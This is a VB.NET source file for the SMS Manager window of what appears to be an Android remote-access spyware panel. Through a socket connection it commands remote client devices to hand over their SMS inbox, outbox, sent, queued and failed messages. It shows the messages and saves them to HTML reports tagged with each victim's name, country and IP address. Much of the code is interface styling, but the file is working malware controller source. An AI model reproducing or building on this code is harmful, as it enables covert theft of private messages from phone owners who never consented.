Imports System.ComponentModel
 Public Class SMSManager
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Client
     Public TextMessage As TextMessage
     Public Title As String = "null"
     Public tmpFolderUSER, tmpClientName, tmpCountry, tmpAddressIP As String
     Private BoxTitlePaintEventArgsWait As Boolean = False
     Private Sub SpyStyle()
        BoxTitle.BackColor = SpySettings.DefaultColor_Background
        For Each gr As DataGridView In Me.Controls.OfType(Of DataGridView)()
            gr.BackgroundColor = SpySettings.DefaultColor_Background
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background
              gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
            gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
        Next
     End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub SMSManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\14.ico")
         SpyStyle()
         Me.ctx.Renderer = New ThemeToolStrip
         CType(PathsToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
         CType(PathsToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ctx.BackColor
         DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f
         DGV0.DefaultCellStyle.Font = reso.f
         If SpySettings.SAVING_DATA = "No" Then
            SaveToolStripMenuItem.Visible = True
            SaveAsToolStripMenuItem.Visible = True
        End If
         Me.Text = Title
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
         BoxTitlePaintEventArgsWait = True
     End Sub
     Private Sub DGV0_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.CellContentClick
     End Sub
    Private Sub DGV0_CellClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.CellClick
         If Not e.RowIndex = -1 And Not e.ColumnIndex = -1 Then
             SelectMessage(e.RowIndex)
         End If
     End Sub
    Private Sub DGV0_RowEnter(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.RowEnter
         If Not e.RowIndex = -1 And Not e.ColumnIndex = -1 Then
             SelectMessage(e.RowIndex)
         End If
     End Sub
    Private Sub SelectMessage(ByVal index As Integer)
         If Not index = -1 Then
              Dim handle As String = "Text_Message_" & classClient.ClientRemoteAddress
             TextMessage = My.Application.OpenForms(handle)
             If TextMessage Is Nothing Then
                 TextMessage = New TextMessage
                 TextMessage.Name = handle
                 TextMessage.Title = String.Format("{0} - IP:{1}", "Text Message", classClient.ClientAddressIP)
                 TextMessage.Client = Client
                 TextMessage.classClient = classClient
                 TextMessage.WindowState = FormWindowState.Minimized
                 Me.TopMost = True
                 DirectCast(TextMessage, Control).Show()
                 TextMessage.WindowState = FormWindowState.Normal
                 Me.TopMost = False
             End If
             TextMessage.TextMsg.Text = CStr(DGV0.Rows(index).Tag)
             TextMessage.TextMsg.Font = reso.f
         End If
     End Sub
     Private Sub SMSManager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         If TextMessage IsNot Nothing Then
             TextMessage.Close()
         End If
     End Sub
    Private Sub GetPaths(ByVal v As String)
         If Not classClient Is Nothing Then
             Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".sms" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getSMS & sockets.Data.SPL_SOCKET & "sms" & sockets.Data.SPL_DATA & v, Codes.Encoding().GetBytes("null"), classClient}
             classClient.SendAsync(objs)
         End If
     End Sub
    Private Sub AllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllToolStripMenuItem.Click
        GetPaths(("content://sms/"))
    End Sub
     Private Sub OutboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OutboxToolStripMenuItem.Click
        GetPaths(("content://sms/outbox"))
    End Sub
     Private Sub InboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InboxToolStripMenuItem.Click
        GetPaths(("content://sms/inbox"))
    End Sub
     Private Sub SentToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SentToolStripMenuItem.Click
        GetPaths(("content://sms/sent"))
    End Sub
     Private Sub QueuedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles QueuedToolStripMenuItem.Click
        GetPaths(("content://sms/queued"))
    End Sub
     Private Sub FailedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FailedToolStripMenuItem.Click
        GetPaths(("content://sms/failed"))
    End Sub
     Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim SaveAS As New SaveFileDialog
        SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
        SaveAS.Filter = "html (*.html)|*.html"
        If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, "null", SaveAS.FileName,
            tmpClientName, tmpCountry & " - " & tmpAddressIP, "SMS", "sms", "null"})
        End If
        SaveAS.Dispose()
     End Sub
     Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        reso.Directory_Exist(classClient)
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, tmpFolderUSER, "SMS Manager",
        tmpClientName, tmpCountry & " - " & tmpAddressIP, "SMS", "sms", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
     End Sub
     Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs) Handles BoxTitle.Paint
         If BoxTitlePaintEventArgsWait Then
             Dim DGV0Count As Integer = DGV0.Rows.Count
             Dim _DGV0Count As String = "All " & CStr(DGV0Count)
             Dim _DGV0_SEL As String = "Selected " & CStr(DGV0.SelectedRows.Count)
             Dim clr As Color = SpySettings.DefaultColor_Foreground
             e.Graphics.DrawLine(New Pen(Color.FromArgb(50, clr.R, clr.G, clr.B)), 0, 1, BoxTitle.Width, 1)
             Dim ColorFont As Brush
             ColorFont = New SolidBrush(SpySettings.DefaultColor_Foreground)
             Dim ColorBack As Brush = New SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B))
             Dim TextRender0 As Size = TextRenderer.MeasureText(_DGV0Count & Space(10) & _DGV0_SEL, reso.f)
             Dim rect0 As New Rectangle(0, 2, BoxTitle.Width, TextRender0.Height + 5)
             e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect0)
             e.Graphics.DrawString(_DGV0Count & Space(10) & _DGV0_SEL & Space(10), reso.f, ColorFont, 0, 2)
             Dim MeSize As Size = TextRenderer.MeasureText("S", reso.f)
            If Not BoxTitle.Height = MeSize.Height + 3 Then
                BoxTitle.Height = MeSize.Height + 3
            End If
         End If
     End Sub
    Private Sub AngelAndroidForm_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        BoxTitle.Invalidate()
    End Sub
    Private Sub AngelAndroidForm_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        BoxTitle.Invalidate()
    End Sub
    Private Sub BoxTitle_Resize(sender As Object, e As EventArgs) Handles BoxTitle.Resize
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_RowsRemoved(sender As Object, e As DataGridViewRowsRemovedEventArgs) Handles DGV0.RowsRemoved
        BoxTitle.Invalidate()
    End Sub
     Private Sub DGV0_RowsAdded(sender As Object, e As DataGridViewRowsAddedEventArgs) Handles DGV0.RowsAdded
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_SelectionChanged(sender As Object, e As EventArgs) Handles DGV0.SelectionChanged
        BoxTitle.Invalidate()
    End Sub
 End Class